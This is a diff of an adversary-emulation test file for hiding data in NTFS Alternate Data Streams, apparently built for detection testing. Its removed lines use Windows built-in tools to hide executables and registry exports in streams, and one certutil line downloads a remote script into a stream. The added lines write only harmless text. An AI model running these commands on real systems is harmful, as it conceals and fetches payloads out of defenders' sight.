@@ -24,16 +24,9 @@ atomic_tests:
     name: command_prompt
     elevation_required: true
     command: |
-      type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"
-      extrac32 #{path}\procexp.cab #{path}\file.txt:procexp.exe
-      findstr /V /L W3AllLov3DonaldTrump #{path}\procexp.exe > #{path}\file.txt:procexp.exe
-      certutil.exe -urlcache -split -f https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/atomics/T1096/src/test.ps1 c:\temp:ttt
-      makecab #{path}\autoruns.exe #{path}\cabtest.txt:autoruns.cab
-      print /D:#{path}\file.txt:autoruns.exe #{path}\Autoruns.exe
-      reg export HKLM\SOFTWARE\Microsoft\Evilreg #{path}\file.txt:evilreg.reg
-      regedit /E #{path}\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey
-      expand \\webdav\folder\file.bat #{path}\file.txt:file.bat
-      esentutl.exe /y #{path}\autoruns.exe /d #{path}\file.txt:autoruns.exe /o
+      echo Normal text > normal.txt
+      echo Hidden text > normal.txt:hidden.txt
+      del normal.txt
 
 - name: Store file in Alternate Data Stream (ADS)
   description: |
